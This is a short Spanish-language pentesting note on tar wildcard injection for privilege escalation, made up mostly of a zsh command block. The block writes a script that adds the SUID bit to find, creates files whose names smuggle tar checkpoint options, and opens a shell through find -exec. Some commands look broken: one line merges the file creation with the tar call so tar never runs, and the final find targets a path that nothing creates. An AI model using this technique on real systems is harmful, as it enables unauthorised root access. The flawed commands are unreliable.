[Wildcard privilege escalation](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)

Si hay un script, cronjob, comando... Que se ejecuta con un wildcard(`*`) se puede aprovechar la expansión del wildcards para ejecutar código arbitrario con los permisos del usuario que ejecuta dicho script o cronjob.

```zsh
echo "chmod u+s /usr/bin/find" > test.sh ## Este script añade el bit SUID al binario find
echo "" > "--checkpoint-action=exec=sh test.sh" ## Crea un archivo vacío cuyo nombre es un parámetro para pasarle a tar
echo "" > --checkpoint=1 tar cf archive.tar * ## Al expandir el wildcard al nombre de los archivos vacíos convierte el nombre del archivo en una instrucción, ejecutando el script que da el bit SUID al binario find


find f1 -exec "/bin/sh" \;
id
whoami
```
